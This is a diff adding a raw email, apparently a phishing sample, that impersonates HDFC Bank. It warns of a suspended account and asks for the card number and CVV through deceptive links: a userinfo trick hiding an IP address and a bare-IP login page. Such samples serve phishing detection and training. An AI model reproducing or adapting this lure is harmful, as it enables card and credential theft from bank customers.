@@ -1,0 +1,24 @@
+Return-Path: <info@secure-mailer.click>
+Received: from secure-mailer.click (unknown [103.145.13.88]) by mx.example-recipient.in; Sat, 31 Oct 2026 22:05:44 +0530
+Authentication-Results: mx.example-recipient.in; spf=fail smtp.mailfrom=secure-mailer.click; dkim=none; dmarc=none
+From: "netbanking@hdfcbank.com" <info@secure-mailer.click>
+To: customer@example-recipient.in
+Subject: HDFC Bank: Unusual login detected - verify your identity
+Date: Sat, 31 Oct 2026 22:05:40 +0530
+Message-ID: <5512.991@secure-mailer.click>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+
+<html><body>
+<p>Dear Valued Customer,</p>
+<p>We detected an unusual login to your HDFC NetBanking from a new device. =
+For your security your account has been suspended.</p>
+<p>Please verify your identity and re-enter your debit card number and CVV =
+to reactivate your account.</p>
+<p><a href=3D"http://www.hdfcbank.com@185.212.47.103/netbanking/verify">Ver=
+ify now</a></p>
+<p>Or visit: <a href=3D"http://103.145.13.88/hdfc/login.html">http://103.14=
+5.13.88/hdfc/login.html</a></p>
+<p>HDFC Bank Security Team</p>
+</body></html>
